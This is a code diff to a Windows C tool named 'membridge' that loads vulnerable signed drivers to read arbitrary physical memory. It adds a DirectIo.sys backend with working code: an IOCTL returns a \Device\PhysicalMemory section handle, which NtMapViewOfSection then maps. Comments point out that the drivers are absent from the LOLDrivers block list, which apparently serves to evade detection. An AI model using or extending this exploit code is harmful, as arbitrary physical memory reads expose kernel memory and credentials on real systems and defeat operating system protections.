@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -87,6 +87,9 @@ static const backend_t g_backends[] = {
     { L"fastdumpx64", L"drivers\\fastdumpx64\\fastdumpx64.sys",
       BK_CONTROL, L"MembridgeFastDump", L"\\\\.\\FastDump", LY_FASTDUMP, 1,
       L"fastdumpx64.sys 2.3.0.92 (LOLDrivers unlisted; IOCTL 0x9C400014: u64 PA + u32 size, data at output+0x34, arbitrary 64-bit PA read)" },
+    { L"directio", L"drivers\\directio\\DirectIo.sys",
+      BK_CONTROL, L"MembridgeDirectIo", L"\\\\.\\DirectIo", LY_DIRECTIO, 1,
+      L"DirectIo.sys (LOLDrivers unlisted PassMark DirectIO; IOCTL 0x8011607C returns \\Device\\PhysicalMemory section handle, NtMapViewOfSection arbitrary physical read; device name = service name)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -100,6 +103,7 @@ static backend_t g_bk;
 static int g_have_bk = 0;
 static wchar_t g_base[512];
 static wchar_t g_driver_path[1024];
+static wchar_t g_dyn_device[512];
 static int g_loaded_service = 0;
 static int g_bound_device = 0;
 static wchar_t g_instance_id[256];
@@ -121,6 +125,7 @@ static const char *layout_name(layout_t l) {
     case LY_GLCKIO2_MAP: return "glckio2";
     case LY_GIBEPEXT: return "gibepext";
     case LY_FASTDUMP: return "fastdump";
+    case LY_DIRECTIO: return "directio";
     }
     return "?";
 }
@@ -666,6 +671,43 @@ static int read_fastdump(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return ok ? 1 : 0;
 }
 
+// DirectIo.sys (PassMark DirectIO, unlisted): IOCTL 0x8011607C returns a handle to
+// \Device\PhysicalMemory opened with SECTION_MAP_READ; the user then maps an arbitrary
+// physical page via NtMapViewOfSection and reads it.
+typedef LONG (NTAPI *NtMapViewOfSection_p)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
+                                          PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+typedef LONG (NTAPI *NtUnmapViewOfSection_p)(HANDLE, PVOID);
+
+static int read_directio(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint64_t section = 0;
+    DWORD ret = 0;
+    if (!DeviceIoControl(dev, 0x8011607Cu, NULL, 0, &section, sizeof(section), &ret, NULL) || !section) {
+        wprintf(L"[ERR] directio IOCTL 0x8011607C err=%lu\n", GetLastError());
+        return 0;
+    }
+    HMODULE nt = GetModuleHandleA("ntdll.dll");
+    NtMapViewOfSection_p pmap = nt ? (NtMapViewOfSection_p)GetProcAddress(nt, "NtMapViewOfSection") : NULL;
+    NtUnmapViewOfSection_p punmap = nt ? (NtUnmapViewOfSection_p)GetProcAddress(nt, "NtUnmapViewOfSection") : NULL;
+    if (!pmap) { CloseHandle((HANDLE)(uintptr_t)section); return 0; }
+    uint64_t page = pa & ~0xFFFull;
+    uint32_t off = (uint32_t)(pa & 0xFFF);
+    SIZE_T view = (SIZE_T)((off + size + 0xFFF) & ~0xFFFu);
+    LARGE_INTEGER secOff;
+    secOff.QuadPart = (LONGLONG)page;
+    PVOID base = NULL;
+    LONG st = pmap((HANDLE)(uintptr_t)section, GetCurrentProcess(), &base, 0, 0,
+                   &secOff, &view, 2 /*ViewUnmap*/, 0, PAGE_READONLY);
+    if (st < 0) {
+        wprintf(L"[ERR] directio NtMapViewOfSection status=0x%08lX\n", (unsigned long)st);
+        CloseHandle((HANDLE)(uintptr_t)section);
+        return 0;
+    }
+    memcpy(out, (uint8_t *)base + off, size);
+    if (punmap) punmap(GetCurrentProcess(), base);
+    CloseHandle((HANDLE)(uintptr_t)section);
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -679,6 +721,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_GLCKIO2_MAP: return read_glckio2_map(dev, pa, size, out);
     case LY_GIBEPEXT: return read_gibepext(dev, pa, size, out);
     case LY_FASTDUMP: return read_fastdump(dev, pa, size, out);
+    case LY_DIRECTIO: return read_directio(dev, pa, size, out);
     }
     return 0;
 }
@@ -720,7 +763,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -773,6 +816,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"glckio2") == 0 || _wcsicmp(layout, L"glckio") == 0) g_manual_layout = LY_GLCKIO2_MAP;
         else if (_wcsicmp(layout, L"gibepext") == 0) g_manual_layout = LY_GIBEPEXT;
         else if (_wcsicmp(layout, L"fastdump") == 0 || _wcsicmp(layout, L"fastdumpx64") == 0) g_manual_layout = LY_FASTDUMP;
+        else if (_wcsicmp(layout, L"directio") == 0) g_manual_layout = LY_DIRECTIO;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
@@ -780,6 +824,11 @@ int wmain(int argc, wchar_t **argv) {
         }
         if (!g_have_bk) { wprintf(L"[ERR] unknown backend %ls (use --list)\n", backend); return 6; }
         swprintf(g_service_cur, 160, L"%ls_%lu", g_bk.service, GetCurrentProcessId());
+        if (_wcsicmp(g_bk.id, L"directio") == 0) {
+            // DirectIo derives its symbolic link name from the service name.
+            swprintf(g_dyn_device, 512, L"\\\\.\\%ls", g_service_cur);
+            g_bk.device = g_dyn_device;
+        }
         if (driver_override) { wcsncpy(g_driver_path, driver_override, 1023); g_driver_path[1023] = 0; }
         else build_driver_path();
     } else { wprintf(L"[ERR] --backend or --device/--layout required\n"); return 6; }
